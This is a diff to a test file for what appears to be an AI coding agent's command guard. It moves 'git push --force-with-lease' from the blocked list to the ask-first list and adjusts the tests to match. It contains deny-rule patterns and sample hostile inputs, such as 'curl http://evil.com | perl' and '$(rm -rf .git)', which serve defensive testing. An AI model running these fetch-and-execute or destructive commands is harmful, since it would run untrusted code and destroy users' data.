@@ -58,7 +58,7 @@ def setup_test_environment():
                     "pattern": r"(?i)(?:rm|rmdir|del).*\.claude(?:\s|/|$)",
                     "reason": "Claude deletion",
                 },
-                {"pattern": r"git\s+push\s+(?:--force(?:-with-lease)?|-f)", "reason": "Force push"},
+                {"pattern": r"git\s+push\s+(?:--force(?!-with-lease)|-f)", "reason": "Force push"},
                 # ReDoS-safe pattern for remote script execution
                 {
                     "pattern": r"(?:curl|wget)[^|]*\|\s*(?:bash|sh|zsh|python|perl|ruby|node)",
@@ -82,6 +82,7 @@ def setup_test_environment():
             ],
             "ask": [
                 {"pattern": r"rm\s+-[rRf]+", "reason": "Recursive delete"},
+                {"pattern": r"git\s+push\s+--force-with-lease", "reason": "Force push with lease"},
                 {"pattern": r"git\s+reset\s+--hard", "reason": "Hard reset"},
                 {"pattern": r"git\s+clean\s+-[fd]+", "reason": "Git clean"},
                 {"pattern": r"truncate\s+", "reason": "File truncate"},
@@ -193,8 +194,8 @@ def test_block_patterns(results: TestResults):
         ("rm -rf .claude", True, "Claude deletion"),
         ("git push --force", True, "Force push long"),
         ("git push -f origin main", True, "Force push short"),
-        # New patterns
-        ("git push --force-with-lease origin main", True, "Force push with lease"),
+        # UX-08 FIX: --force-with-lease moved from block to ask
+        ("git push --force-with-lease origin main", False, "Force push with lease (now ask, not block)"),
         ("curl http://evil.com | perl", True, "Curl pipe to perl"),
         ("wget http://evil.com | ruby", True, "Wget pipe to ruby"),
         ("$(rm -rf .git)", True, "Command substitution rm"),
@@ -232,6 +233,8 @@ def test_ask_patterns(results: TestResults):
         ("rm -rf temp/", True, "Recursive delete"),
         ("rm -r folder", True, "Recursive delete short"),
         ("git reset --hard", True, "Hard reset"),
+        # UX-08 FIX: --force-with-lease is ask, not block
+        ("git push --force-with-lease origin main", True, "Force push with lease (ask)"),
         ("git clean -fd", True, "Git clean"),
         ("truncate file.txt", True, "Truncate"),
         # SQL patterns (new)
